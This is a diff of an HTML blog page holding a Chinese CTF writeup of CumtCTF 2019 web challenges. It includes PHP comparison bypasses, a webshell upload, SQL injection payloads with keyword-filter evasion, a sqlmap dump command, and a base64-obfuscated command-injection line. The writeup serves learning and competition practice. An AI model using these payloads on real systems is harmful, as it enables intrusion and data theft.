@@ -166,7 +166,7 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h4><span id="web1签到题">Web1：签到题</span></h4><p>1、打开题目，源码直接显示在网页上。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302192458801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="web1"></p>
+            <h4 id="Web1：签到题"><a href="#Web1：签到题" class="headerlink" title="Web1：签到题"></a>Web1：签到题</h4><p>1、打开题目，源码直接显示在网页上。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302192458801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="web1"></p>
 <p>2、发现构造0ver、0ver1、0ver2即可，下面就进行代码审计：</p>
 <p>（1）首先构造 0ver，有以下三个条件：<br>① <code>ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)</code>，即要进行一次或多次 0-9 数字正则表达式匹配<br>② <code>in_array($a,$white_list)</code>，即0ver 中要有 range（0，9）<br>③ <code>strlen($a)&gt;1</code>，即0ver 的长度要大于 1</p>
 <p>一开始以为要考ereg()截断漏洞，其实是in_array()松散比较，即</p>
@@ -187,8 +187,8 @@ var_dump(in_array(&#39;01&#39;,array(&#39;1&#39;)));
 <pre><code>md5($c) === md5($b) &amp;&amp; ($b !== $c)
 </code></pre><p>所以要构造 md5 相同，真值不同的两个参数，但注意这里 md5 用===判断，所以不能利用md5 开头是 0e 的字符串来绕过，但可以利用数组绕过。<br><strong>因此构造：0ver1[]=1&amp;0ver2[]=2</strong></p>
 <p>3、最终构造的payload为：<code>?0ver=01&amp;0ver1[]=1&amp;0ver2[]=2</code>，得到 flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303100623661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="web2simpleupload签到">Web2：SimpleUpload签到</span></h4><p>1、只允许png/gif/jpg文件格式，查看源码，判断为前端验证，并且提示flag在当前目录的flag.php <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201142580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>2、上传后缀为png的一句话木马，BurpSuite抓包改后缀为php，拿到链接。<br> <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201312733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>3、用菜刀链接木马，根据提示在flag.php中找到flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201335585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="web3小型线上赌场">Web3：小型线上赌场</span></h4><p>1、 这一题要求下注并猜测赚的钱，但是赔率没刷新或提交一次页面都会变化。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201610824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>2、根据题目及后续的hint可知存在vim备份文件泄露，<code>.index.swp</code>下载swp。<br> <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302202053379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>3、在kali下面对得到的index.swp文件进行恢复，进入文件的目录后<code>vim -r index.swp</code>，得到源码。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302202211400.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>4、进行代码审计</p>
+<h4 id="Web2：SimpleUpload签到"><a href="#Web2：SimpleUpload签到" class="headerlink" title="Web2：SimpleUpload签到"></a>Web2：SimpleUpload签到</h4><p>1、只允许png/gif/jpg文件格式，查看源码，判断为前端验证，并且提示flag在当前目录的flag.php <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201142580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>2、上传后缀为png的一句话木马，BurpSuite抓包改后缀为php，拿到链接。<br> <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201312733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>3、用菜刀链接木马，根据提示在flag.php中找到flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201335585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
+<h4 id="Web3：小型线上赌场"><a href="#Web3：小型线上赌场" class="headerlink" title="Web3：小型线上赌场"></a>Web3：小型线上赌场</h4><p>1、 这一题要求下注并猜测赚的钱，但是赔率没刷新或提交一次页面都会变化。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201610824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>2、根据题目及后续的hint可知存在vim备份文件泄露，<code>.index.swp</code>下载swp。<br> <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302202053379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>3、在kali下面对得到的index.swp文件进行恢复，进入文件的目录后<code>vim -r index.swp</code>，得到源码。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302202211400.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>4、进行代码审计</p>
 <pre><code class="php">&lt;?php
     $invest = $_GET[&#39;invest&#39;];  
     $rand = rand(2,50);  
@@ -216,7 +216,7 @@ var_dump(in_array(&#39;01&#39;,array(&#39;1&#39;)));
 </code></pre>
 <p>最后的判断逻辑为：猜测的数(guess)与money相等，且money的长度与invest的长度相等。<br>问题出现在<code>intval()</code>函数上，关于此函数返回值如下：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302203014110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>也就是说当传入<code>intval()</code>的参数足够大时，其返回值根据操作系统的不同，是固定的数值（32位：2147483647，64位：9223372036854775807），这一题也就是传入的invest的数足够大时，无论随机数是多少，经过<code>intval()</code>函数处理过的money的值均是不变的。</p>
 <p>这样思路也就很清楚了，只需将guess的值等于money的64位上限值，也就是9223372036854775807，invest的长度要等于money的长度（任意19位数字），即可得到flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302203942515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="web4simplesqli">Web4：SimpleSQLi</span></h4><p>一道没有任何过滤的SQL注入题<br>（1）手工注入过程如下:</p>
+<h4 id="Web4：SimpleSQLi"><a href="#Web4：SimpleSQLi" class="headerlink" title="Web4：SimpleSQLi"></a>Web4：SimpleSQLi</h4><p>一道没有任何过滤的SQL注入题<br>（1）手工注入过程如下:</p>
 <pre><code>爆表名
 ?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())  --+
 </code></pre><p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302210130304.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
@@ -228,7 +228,7 @@ var_dump(in_array(&#39;01&#39;,array(&#39;1&#39;)));
 </code></pre><p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302210147697.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>（2）sqlmap注入：</p>
 <pre><code>python2 sqlmap.py -u &quot;http://bxs.cumt.edu.cn:30007/test/index.php?id=1&quot; -D security -T flagishere -C flag --dump
 </code></pre><p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302213143188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="web5真的简单">Web5：真的简单。。</span></h4><p>（1）也是一道SQL注入题，但是过滤了 <code>union</code> 、<code>select</code>、<code>or</code>、<code>and</code>等关键词，可以通过<strong>双写绕过</strong>。</p>
+<h4 id="Web5：真的简单。。"><a href="#Web5：真的简单。。" class="headerlink" title="Web5：真的简单。。"></a>Web5：真的简单。。</h4><p>（1）也是一道SQL注入题，但是过滤了 <code>union</code> 、<code>select</code>、<code>or</code>、<code>and</code>等关键词，可以通过<strong>双写绕过</strong>。</p>
 <pre><code>payload:
 爆表名(这里注意information中也包含&#39;or&#39;,所以也要双写&#39;or&#39;)
 ?id=-1&#39; uniunionon seleselectct 1,2,(seleselectct group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())  --+
@@ -243,7 +243,7 @@ var_dump(in_array(&#39;01&#39;,array(&#39;1&#39;)));
 <p>输入如下命令进行执行，即可获得flag：</p>
 <pre><code>`echo$IFS&quot;Y2F0IC9mbGFnXzMzMTQvZmxhZw==&quot;|base64$IFS-d`
 </code></pre><p>(对命令执行的绕过方法还不太熟悉，题目不能复现了，等学习后再详细解释吧…)<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302213050858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="web6simplesqli2">Web6：SimpleSQLi2</span></h4><p>（1）这还是一道SQL注入题，但是只会回显<code>Welcome to CUMTCTF&#39;2019~</code>和<code>NoNoNo~</code>两个页面，因此可以判断为SQL盲注。<br>（2）过滤方式和上一题差不多，但测试发现只要构造的payload里有含有空格，均返回<code>NoNoNo~</code>页面，所以判断空格被过滤了。<br>（3）关键词依旧可以通过双写绕过，空格可以通过<code>/**/</code>绕过，通过下面判断出为数字型注入，构造的代码可以直接执行。</p>
+<h4 id="Web6：SimpleSQLi2"><a href="#Web6：SimpleSQLi2" class="headerlink" title="Web6：SimpleSQLi2"></a>Web6：SimpleSQLi2</h4><p>（1）这还是一道SQL注入题，但是只会回显<code>Welcome to CUMTCTF&#39;2019~</code>和<code>NoNoNo~</code>两个页面，因此可以判断为SQL盲注。<br>（2）过滤方式和上一题差不多，但测试发现只要构造的payload里有含有空格，均返回<code>NoNoNo~</code>页面，所以判断空格被过滤了。<br>（3）关键词依旧可以通过双写绕过，空格可以通过<code>/**/</code>绕过，通过下面判断出为数字型注入，构造的代码可以直接执行。</p>
 <table>
 <thead>
 <tr>
@@ -304,7 +304,7 @@ for i in range(1,50):
     print(flag)    
 </code></pre>
 <p>最终获得flag如下：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303130639145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="web7文件管理系统">Web7：文件管理系统</span></h4><p>1、先扫目录，发现可以下载源码，进行代码审计。<br>2、查看upload.php代码，发现是如下白名单验证，无法上传绕过。</p>
+<h4 id="Web7：文件管理系统"><a href="#Web7：文件管理系统" class="headerlink" title="Web7：文件管理系统"></a>Web7：文件管理系统</h4><p>1、先扫目录，发现可以下载源码，进行代码审计。<br>2、查看upload.php代码，发现是如下白名单验证，无法上传绕过。</p>
 <pre><code class="php">&lt;?php
 
 require_once &quot;common.inc.php&quot;;
